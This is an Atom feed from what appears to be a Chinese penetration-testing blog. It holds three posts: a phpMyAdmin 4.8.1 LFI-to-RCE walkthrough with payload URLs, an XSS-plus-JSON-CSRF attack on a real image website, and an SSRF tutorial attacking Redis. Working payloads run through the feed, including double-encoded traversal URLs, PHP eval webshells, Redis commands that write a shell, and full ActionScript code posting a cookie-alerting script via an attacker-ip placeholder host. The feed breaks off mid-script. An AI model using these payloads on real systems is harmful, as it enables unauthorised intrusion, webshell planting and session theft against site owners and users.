<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Damit5&#39;s Blog</title>
  
  
  <link href="//atom.xml" rel="self"/>
  
  <link href="https://damit5.com/"/>
  <updated>2018-06-25T10:29:42.005Z</updated>
  <id>https://damit5.com/</id>
  
  <author>
    <name>Damit 5</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>phpMyAdmin 4.8.1 LFI to RCE（CVE-2018-12613）</title>
    <link href="https://damit5.com/2018/06/25/phpMyAdmin-4-8-1-LFI-to-RCE%EF%BC%88CVE-2018-12613%EF%BC%89/"/>
    <id>https://damit5.com/2018/06/25/phpMyAdmin-4-8-1-LFI-to-RCE（CVE-2018-12613）/</id>
    <published>2018-06-25T10:05:25.000Z</published>
    <updated>2018-06-25T10:29:42.005Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><div id="aplayer0" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer0"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "/Music/233.jpg",}});</script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。借由此Web接口可以成为一个简易方式输入繁杂SQL语法的较佳途径，尤其要处理大量资料的汇入及汇出更为方便。其中一个更大的优势在于由于phpMyAdmin跟其他PHP程式一样在网页服务器上执行，但是您可以在任何地方使用这些程式产生的HTML页面，也就是于远端管理MySQL数据库，方便的建立、修改、删除数据库及资料表。也可借由phpMyAdmin建立常用的php语法，方便编写网页时所需要的sql语法正确性。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><img src="C:/Users/h/Desktop/img/2.png" alt=""></p><ul><li>可见第 61 行出现 <code>include $_REQUEST[&#39;target&#39;];</code>，这是文件包含的前兆，只需要满足 55 - 59 行的条件即可</li><li>第57行限制 <code>target</code> 参数不能以<code>index</code>开头</li><li>第58行限制 <code>target</code> 参数不能出现在 <code>$target_blacklist</code> 内</li></ul><p>找到 <code>$target_blacklist</code> 的定义</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$target_blacklist = array (</div><div class="line">    &apos;import.php&apos;, &apos;export.php&apos;</div><div class="line">);</div></pre></td></tr></table></figure><blockquote><p>只要 target 参数不是 import.php 或 export.php 就行</p></blockquote><ul><li>第59行 <code>Core::checkPageValidity($_REQUEST[&#39;target&#39;])</code></li></ul><p>找到Core类的checkPageValidity方法</p><p>文件路径 <code>phpMyAdmin4.8.1\libraries\classes</code></p><p><img src="img/3.png" alt=""></p><p>可见 465 行，有一个 <code>urldecode()</code> 函数</p><p>把 <code>?</code> 两次url编码为 <code>%253f</code> 即可绕过验证</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul><li>phpstudy</li><li>php 5.5.38+Apache</li><li>phpMyAdmin 4.8.1</li></ul><h2 id="本地文件包含（LFI）"><a href="#本地文件包含（LFI）" class="headerlink" title="本地文件包含（LFI）"></a>本地文件包含（LFI）</h2><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/phpMyAdmin4.8.1/index.php?target=db_sql.php%253f/../../index.html</div></pre></td></tr></table></figure><p><img src="C:/Users/h/Desktop/img/1.png" alt=""></p><p>这里的 <code>db_sql.php</code> 我们只需要满足在 <code>$goto_whitelist</code> 就行了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">public static $goto_whitelist = array(</div><div class="line">        &apos;db_datadict.php&apos;,</div><div class="line">        &apos;db_sql.php&apos;,</div><div class="line">        &apos;db_events.php&apos;,</div><div class="line">        &apos;db_export.php&apos;,</div><div class="line">        &apos;db_importdocsql.php&apos;,</div><div class="line">        &apos;db_multi_table_query.php&apos;,</div><div class="line">        &apos;db_structure.php&apos;,</div><div class="line">        &apos;db_import.php&apos;,</div><div class="line">        &apos;db_operations.php&apos;,</div><div class="line">        &apos;db_search.php&apos;,</div><div class="line">        &apos;db_routines.php&apos;,</div><div class="line">        &apos;export.php&apos;,</div><div class="line">        &apos;import.php&apos;,</div><div class="line">        &apos;index.php&apos;,</div><div class="line">        &apos;pdf_pages.php&apos;,</div><div class="line">        &apos;pdf_schema.php&apos;,</div><div class="line">        &apos;server_binlog.php&apos;,</div><div class="line">        &apos;server_collations.php&apos;,</div><div class="line">        &apos;server_databases.php&apos;,</div><div class="line">        &apos;server_engines.php&apos;,</div><div class="line">        &apos;server_export.php&apos;,</div><div class="line">        &apos;server_import.php&apos;,</div><div class="line">        &apos;server_privileges.php&apos;,</div><div class="line">        &apos;server_sql.php&apos;,</div><div class="line">        &apos;server_status.php&apos;,</div><div class="line">        &apos;server_status_advisor.php&apos;,</div><div class="line">        &apos;server_status_monitor.php&apos;,</div><div class="line">        &apos;server_status_queries.php&apos;,</div><div class="line">        &apos;server_status_variables.php&apos;,</div><div class="line">        &apos;server_variables.php&apos;,</div><div class="line">        &apos;sql.php&apos;,</div><div class="line">        &apos;tbl_addfield.php&apos;,</div><div class="line">        &apos;tbl_change.php&apos;,</div><div class="line">        &apos;tbl_create.php&apos;,</div><div class="line">        &apos;tbl_import.php&apos;,</div><div class="line">        &apos;tbl_indexes.php&apos;,</div><div class="line">        &apos;tbl_sql.php&apos;,</div><div class="line">        &apos;tbl_export.php&apos;,</div><div class="line">        &apos;tbl_operations.php&apos;,</div><div class="line">        &apos;tbl_structure.php&apos;,</div><div class="line">        &apos;tbl_relation.php&apos;,</div><div class="line">        &apos;tbl_replace.php&apos;,</div><div class="line">        &apos;tbl_row_action.php&apos;,</div><div class="line">        &apos;tbl_select.php&apos;,</div><div class="line">        &apos;tbl_zoom_select.php&apos;,</div><div class="line">        &apos;transformation_overview.php&apos;,</div><div class="line">        &apos;transformation_wrapper.php&apos;,</div><div class="line">        &apos;user_password.php&apos;,</div><div class="line">    );</div></pre></td></tr></table></figure><h2 id="LFI-to-RCE"><a href="#LFI-to-RCE" class="headerlink" title="LFI to RCE"></a>LFI to RCE</h2><p><strong>利用mysql的data文件</strong></p><ul><li>修改或新建一个字段，名字修改为 <code>WebShell</code> 的内容</li></ul><p><img src="C:/Users/h/Desktop/img/4.png" alt=""></p><ul><li>保存</li></ul><p><img src="C:/Users/h/Desktop/img/5.png" alt=""></p><ul><li>找到对应的数据库文件查看</li></ul><p><img src="C:/Users/h/Desktop/img/6.png" alt=""></p><ul><li>包含它</li></ul><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/phpMyAdmin4.8.1/index.php?target=db_sql.php%253f/../../../MySQL/data/test/test.frm</div></pre></td></tr></table></figure><p><img src="C:/Users/h/Desktop/img/7.png" alt=""></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>查MD5官方文章</p><blockquote><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=1&amp;srcid=0621gAv1FMtrgoahD01psMZr&amp;pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK#rd" target="_blank" rel="external">https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=1&amp;srcid=0621gAv1FMtrgoahD01psMZr&amp;pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK#rd</a></p></blockquote><p>【CVE-2018-12613】phpMyAdmin 4.8.1 LFI to RCE</p><blockquote><p><a href="http://www.lz1y.cn/archives/1457.html" target="_blank" rel="external">http://www.lz1y.cn/archives/1457.html</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;div id=&quot;aplayer0&quot; class=&quot;aplayer&quot; style=&quot;margin-bottom: 20px;&quot;&gt;&lt;/div&gt;
		&lt;script&gt;
			new A
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://damit5.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>一次XSS和CSRF的组合拳进攻 (CSRF+JSON)</title>
    <link href="https://damit5.com/2018/06/02/%E4%B8%80%E6%AC%A1XSS%E5%92%8CCSRF%E7%9A%84%E7%BB%84%E5%90%88%E6%8B%B3%E8%BF%9B%E6%94%BB-(CSRF+JSON)/"/>
    <id>https://damit5.com/2018/06/02/一次XSS和CSRF的组合拳进攻-(CSRF+JSON)/</id>
    <published>2018-06-02T07:19:18.000Z</published>
    <updated>2018-06-10T04:00:42.014Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><div id="aplayer16" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer16"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "/Music/233.jpg",}});</script><h2 id="0x00-起因"><a href="#0x00-起因" class="headerlink" title="0x00 起因"></a>0x00 起因</h2><p>和一个高中同学聊天，无意间聊到了某个图片网</p><a id="more"></a><p><img src="img/1.png" alt=""></p><p>什么？25一张？这么贵？</p><p>本着乐于助人的精神，进网站看了看，鼠标右键确实被禁止了，不能保存图片</p><p>但是审查元素后，可以清楚的看到图片的链接，而且还是高清无水印，emmmmmm这网站做得也是没谁了</p><p>解决了高中同学的问题后，想着下午又挺无聊的，于是就拿这个网站做了一下小小的测试（好吧，其实是我不想复习，复习真的好无聊 o(╥﹏╥)o）</p><p>便有了后面的内容</p><hr><p><strong>PS：</strong></p><ul><li>前面信息收集什么的就不多说了，和本文内容也没多大关系，就直接讲重点吧</li><li>因为自己浏览器的问题，验证码加载不出来，所以后面都是用同学的账号做的测试，高强度打码</li></ul><h2 id="0x01-发现存储型XSS漏洞"><a href="#0x01-发现存储型XSS漏洞" class="headerlink" title="0x01 发现存储型XSS漏洞"></a>0x01 发现存储型XSS漏洞</h2><p>大概逛了一下网站，最后进入了信息设置面板</p><p><img src="img/2.png" alt=""></p><p>看着这么多的框，总感觉存在XSS，审查元素后发现 <strong>简介</strong> 是用<code>&lt;textarea&gt;</code>这个标签来闭合的，于是构造 payload</p><p><code>&lt;/textarea&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;textarea&gt;</code></p><p>保存刷新后，成功弹出 <code>xss</code></p><p><img src="img/3.png" alt=""></p><p>至此存储型XSS验证成功</p><h2 id="0x02-分界线"><a href="#0x02-分界线" class="headerlink" title="0x02 分界线"></a>0x02 分界线</h2><p>因为这个页面只有自己能看见，所以也就自己能触发（别人看资料的时候<code>&lt;&gt;</code>会被转义，也就没用了）</p><p>感觉这个洞很鸡肋，这个时候又想到了<strong>CSRF</strong>，如果每个人都自动将简介改成精心生成的恶意代码，那么这样每个人想再次修改自己的资料的时候，就可以触发 <strong>存储型XSS</strong>，我们也就可以盗取cookie、挂马或者其他一系列骚操作</p><h2 id="0x03-CSRF-漏洞"><a href="#0x03-CSRF-漏洞" class="headerlink" title="0x03 CSRF 漏洞"></a>0x03 CSRF 漏洞</h2><p>按照原来一样的操作</p><p><strong>修改信息</strong> –&gt; <strong>保存时抓包</strong> –&gt; <strong>生成CSRF POC</strong> –&gt; <strong>打开POC</strong> –&gt; <strong>检验是否利用成功</strong></p><p>但是这里遇到一个问题</p><p><img src="img/4.png" alt=""></p><p>以前post提交的数据都是形如 <code>a=123&amp;b=456</code> 这种，而这里提交的却是 <code>json</code> 格式的</p><p>于是这里就要利用到一些骚姿势</p><p>偷一张大佬们的图（这里因为需要验证content-type，目前搜到的就只有这种方法）</p><p><img src="img/5.png" alt=""></p><p>后面的大概攻击流程就是这样</p><h3 id="生成-csrf-swf-文件"><a href="#生成-csrf-swf-文件" class="headerlink" title="生成 csrf.swf 文件"></a>生成 <code>csrf.swf</code> 文件</h3><ul><li>从Adobe官网安装<a href="https://www.adobe.com/devnet/flex/flex-sdk-download.html" target="_blank" rel="external">Flex SDK</a>用于将<code>ActionScript</code>编译为swf文件。Flex需要安装<strong>32位JVM</strong>，可以从Oracle官网下载安装32位的JDK。（这里只能用32位的，64位的不行）</li><li>创建一个名为<code>csrf.as</code>的文本文件，写入以下ActionScript代码。</li><li>将<code>&lt;attacker-ip&gt;</code>占位符替换为攻击者服务器的ip或者域名（307跳转页面的地址）</li><li>将此文件编译为<code>csrf.swf</code>，只需运行mxmlc csrf.as命令。这将创建一个名为csrf.swf的文件。</li></ul><p><img src="img/6.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">package</div><div class="line">&#123;</div><div class="line">  import flash.display.Sprite;</div><div class="line">  import flash.net.URLLoader;</div><div class="line">  import flash.net.URLRequest;</div><div class="line">  import flash.net.URLRequestHeader;</div><div class="line">  import flash.net.URLRequestMethod;public class csrf extends Sprite</div><div class="line">  &#123;</div><div class="line">    public function csrf()</div><div class="line">    &#123;</div><div class="line">      super();</div><div class="line">      var member1:Object = null;</div><div class="line">      var myJson:String = null;</div><div class="line">      member1 = new Object();</div><div class="line">      member1 = &#123;</div><div class="line">          &quot;gender&quot;:&quot;2&quot;,</div><div class="line">  &quot;homeCity&quot;:&quot;4170&quot;,</div><div class="line">  &quot;nowCity&quot;:&quot;4170&quot;,</div><div class="line">  &quot;profession&quot;:&quot;23&quot;,</div><div class="line">  &quot;description&quot;:&quot;&lt;/textarea&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;textarea&gt;&quot;,</div><div class="line">  &quot;signature&quot;:&quot;&quot;</div><div class="line">      &#125;;</div><div class="line">      var myData:Object = member1;</div><div class="line">      myJson = JSON.stringify(myData);</div><div class="line">      myJson = JSON.stringify(myData);</div><div class="line">      var url:String = &quot;http://&lt;attacker-ip&gt;/307.php&quot;;</div><div class="line">      var request:URLRequest = new URLRequest(url);</div><div class="line">      request.requestHeaders.push(new URLRequestHeader(&quot;Content-Type&quot;,&quot;application/json&quot;));</div><div class="line">      request.data = myJson;</div><div class="line">      request.method = URLRequestMethod.POST;</div><div class="line">      var urlLoader:URLLoader = new URLLoader();try</div><div class="line">      &#123;</div><div class="line">          urlLoader.load(request);</div><div class="line">          return;</div><div class="line">      &#125;</div><div class="line">      catch(e:Error)</div><div class="line">      &#123;</div><div class="line">          trace(e);</div><div class="line">          return;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><img src="img/x.png" alt="csrf.swf生成成功截图"></p><h3 id="重定向php文件"><a href="#重定向php文件" class="headerlink" title="重定向php文件"></a>重定向php文件</h3><p><code>https://xxxx.cn/xxxx/xxxxx</code> 为你要重定向的地址，即修改用户简介的地址，目标网站，不是攻击者的服务器</p><p><code>307.php</code> 文件内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"> // redirect automatically</div><div class="line"> header(&quot;Location: https://xxxx.cn/xxxx/xxxxx&quot;, true, 307);</div><div class="line"> ?&gt;</div></pre></td></tr></table></figure><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>攻击者将 <code>csrf.swf</code> 和 <code>307.php</code> 文件放入同一目录</p><p>受害者在登陆存在CSRF漏洞的网站后，访问攻击者服务器上的swf文件</p><p><img src="img/7.png" alt=""></p><p>点击启动flash</p><p>可以在下面的网络选项中，看到307跳转成功，而且已经成功提交了POST数据</p><p><img src="img/8.png" alt=""></p><p>此时我们再刷新受害者个人消息页面，即可成功弹出 <code>cookie</code> 值</p><p><img src="img/9.png" alt=""></p><p>到此 <strong>CSRF+XSS</strong> 组合拳成功打出</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><ul><li>有框的地方就可能存在XSS</li><li>一定要细心，不仅仅在网站审查上要细心</li><li>CSRF + JSON 网上也有很多，不过都不是以实战来讲的</li><li>网上有些 CSRF + JSON 的利用有坑（这也是为什么我之前花了一整天都没成功）</li></ul><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p>在JSON端点上利用CSRF漏洞的实践教程</p><blockquote><p><a href="http://www.4hou.com/web/10234.html" target="_blank" rel="external">http://www.4hou.com/web/10234.html</a></p></blockquote><p>Exploiting JSON CSRF</p><blockquote><p><a href="https://www.secpulse.com/archives/61297.html" target="_blank" rel="external">https://www.secpulse.com/archives/61297.html</a></p></blockquote><p>Exploiting JSON Cross Site Request Forgery (CSRF) using Flash</p><blockquote><p><a href="https://www.geekboy.ninja/blog/tag/json-csrf/" target="_blank" rel="external">https://www.geekboy.ninja/blog/tag/json-csrf/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;div id=&quot;aplayer16&quot; class=&quot;aplayer&quot; style=&quot;margin-bottom: 20px;&quot;&gt;&lt;/div&gt;
		&lt;script&gt;
			new APlayer({
				element: document.getElementById(&quot;aplayer16&quot;),
				narrow: false,
				autoplay: true,
				showlrc: 0,
				music: {
					title: &quot;六月的雨&quot;,
					author: &quot;胡歌&quot;,
					url: &quot;/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3&quot;,
					pic: &quot;/Music/233.jpg&quot;,
				}
			});
		&lt;/script&gt;
&lt;h2 id=&quot;0x00-起因&quot;&gt;&lt;a href=&quot;#0x00-起因&quot; class=&quot;headerlink&quot; title=&quot;0x00 起因&quot;&gt;&lt;/a&gt;0x00 起因&lt;/h2&gt;&lt;p&gt;和一个高中同学聊天，无意间聊到了某个图片网&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://damit5.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>SSRF 漏洞学习</title>
    <link href="https://damit5.com/2018/05/26/SSRF-%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>https://damit5.com/2018/05/26/SSRF-漏洞学习/</id>
    <published>2018-05-26T08:31:58.000Z</published>
    <updated>2018-06-10T03:59:19.213Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><div id="aplayer8" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer8"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "/Music/233.jpg",}});</script><h2 id="0x01-SSRF-概述"><a href="#0x01-SSRF-概述" class="headerlink" title="0x01 SSRF 概述"></a>0x01 SSRF 概述</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器</p><a id="more"></a><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><h3 id="环境内容"><a href="#环境内容" class="headerlink" title="环境内容"></a>环境内容</h3><table><thead><tr><th>应用</th><th>版本</th><th>端口号</th></tr></thead><tbody><tr><td>PhpStudy</td><td>php5.4.45+Apache</td><td>80</td></tr><tr><td>Redis</td><td>3.0.501</td><td>6379</td></tr></tbody></table><h3 id="漏洞代码-ssrf-php"><a href="#漏洞代码-ssrf-php" class="headerlink" title="漏洞代码 ssrf.php"></a>漏洞代码 <code>ssrf.php</code></h3><p>此代码用来模拟SSRF，使用curl发起网络请求后返回客户端，请求加载文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$ch = curl_init();</div><div class="line">curl_setopt($ch, CURLOPT_URL, $_GET[&apos;url&apos;]);</div><div class="line">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</div><div class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</div><div class="line">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</div><div class="line">curl_exec($ch);</div><div class="line">curl_close($ch);</div><div class="line">?&gt;</div></pre></td></tr></table></figure><blockquote><p>上面的漏洞代码<code>ssrf.php</code>没有屏蔽回显，所以利用姿势比较多</p></blockquote><h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h3><p><strong>gopher</strong>：gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议（俗称万能协议）。</p><p><strong>公网IP的VPS监听 <code>2333</code> 端口</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[root@host ~]# nc -lvp 2333</div><div class="line">Ncat: Version 6.40 ( http://nmap.org/ncat )</div><div class="line">Ncat: Listening on :::2333</div><div class="line">Ncat: Listening on 0.0.0.0:2333</div></pre></td></tr></table></figure><p><strong>利用 gopher 协议访问</strong></p><p>浏览器直接访问或者用 <code>curl url</code></p><p><code>http://127.0.0.1/ssrf.php?url=gopher://66.112.213.76:2333/_hello</code></p><p><strong>收到回显</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[root@host ~]# nc -lvp 2333</div><div class="line">Ncat: Version 6.40 ( http://nmap.org/ncat )</div><div class="line">Ncat: Listening on :::2333</div><div class="line">Ncat: Listening on 0.0.0.0:2333</div><div class="line">Ncat: Connection from 183.xxx.xxx.xxx.</div><div class="line">Ncat: Connection from 183.xxx.xxx.xxx:9661.</div><div class="line">hello</div></pre></td></tr></table></figure></p><h3 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h3><p>因为此处 <code>ssrf.php</code> 的漏洞代码有回显，所以浏览器直接访问</p><p><code>http://127.0.0.1/ssrf.php?url=dict://127.0.0.1:6379/info</code></p><p>或者终端</p><p><code>curl http://127.0.0.1/ssrf.php?url=dict://127.0.0.1:6379/info</code></p><p>可以获取Redis的配置信息</p><p><img src="img/1.png" alt="Redis 配置"></p><p>同理也可以添加或者查看Redis的信息</p><p>查看Redis存储的内容</p><p><img src="img/2.png" alt="获取Redis目录"></p><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><p>利用 <code>file</code> 协议可以读取任意内容</p><p>前提也是在有回显的情况下</p><p><code>http://127.0.0.1/ssrf.php?url=file:///c:\Users\h\Desktop\hello.txt</code></p><p><img src="img/3.png" alt="读取hello.txt文件内容"></p><h3 id="http-s"><a href="#http-s" class="headerlink" title="http/s"></a>http/s</h3><p>探测内网主机存活</p><h2 id="0x04-攻击Redis"><a href="#0x04-攻击Redis" class="headerlink" title="0x04 攻击Redis"></a>0x04 攻击Redis</h2><h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><h4 id="生成gopher协议的payload"><a href="#生成gopher协议的payload" class="headerlink" title="生成gopher协议的payload"></a>生成gopher协议的payload</h4><ul><li>端口转发</li></ul><p><code>socat -v tcp-listen:4444,fork tcp-connect:localhost:6379</code></p><ul><li>Redis连接4444端口</li></ul><p><code>redis-cli -p 4444</code></p><p>输入对应的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">set shell &quot;&lt;?php @eval($_POST[&apos;shell&apos;]);?&gt;&quot;</div><div class="line">config set dir /var/www/html/   # 此时在linux服务器上测试</div><div class="line">config set dbfilename shell.php</div><div class="line">save</div></pre></td></tr></table></figure><p>可以在socat界面看到数据包</p><p>大概长这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">&gt; 2018/05/26 15:56:25.163014  length=63 from=17 to=79</div><div class="line">*3\r</div><div class="line">$3\r</div><div class="line">set\r</div><div class="line">$5\r</div><div class="line">shell\r</div><div class="line">$32\r</div><div class="line">x&lt;?php @eval($_POST[&apos;shell&apos;]);?&gt;\r</div><div class="line">&lt; 2018/05/26 15:56:25.163312  length=5 from=10163 to=10167</div><div class="line">+OK\r</div><div class="line">&gt; 2018/05/26 15:56:33.773190  length=55 from=80 to=134</div><div class="line">*4\r</div><div class="line">$6\r</div><div class="line">config\r</div><div class="line">$3\r</div><div class="line">set\r</div><div class="line">$3\r</div><div class="line">dir\r</div><div class="line">$14\r</div><div class="line">/var/www/html/\r</div></pre></td></tr></table></figure><ul><li>利用脚本转换为<code>gopher</code>协议可以利用的payload</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">import sys</div><div class="line"></div><div class="line">exp = &apos;&apos;</div><div class="line"></div><div class="line">with open(sys.argv[1]) as f:</div><div class="line">    for line in f.readlines():</div><div class="line">        if line[0] in &apos;&gt;&lt;+&apos;:</div><div class="line">            continue</div><div class="line">        # 判断倒数第2、3字符串是否为\r</div><div class="line">        elif 